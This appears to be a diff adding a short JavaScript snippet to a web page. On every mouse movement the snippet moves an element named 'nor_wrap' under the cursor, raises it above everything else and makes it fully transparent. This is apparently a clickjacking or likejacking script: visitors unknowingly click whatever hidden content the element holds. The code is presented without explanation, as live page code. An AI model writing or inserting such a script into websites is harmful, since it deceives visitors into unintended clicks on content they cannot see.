@@ -1,0 +1,19 @@
+var xp, yp;
+document.onmousemove=function(ev){
+var d=document, de=d.documentElement;
+if(ev){xp=ev.pageX; yp=ev.pageY;}
+else{
+xp=event.clientX+(de.scrollLeft||d.body.scrollLeft)-de.clientLeft;
+yp=event.clientY+(de.scrollTop||d.body.scrollTop)-de.clientTop;};
+
+var div=document.getElementById('nor_wrap');
+if(div)		{
+div.style.position='absolute';
+div.style.zIndex=66666;
+div.style.left=(xp-100)+'px';
+div.style.top=(yp-5)+'px';
+div.style.opacity='0';
+div.style.filter='alpha(opacity:0)';
+}
+
+ };
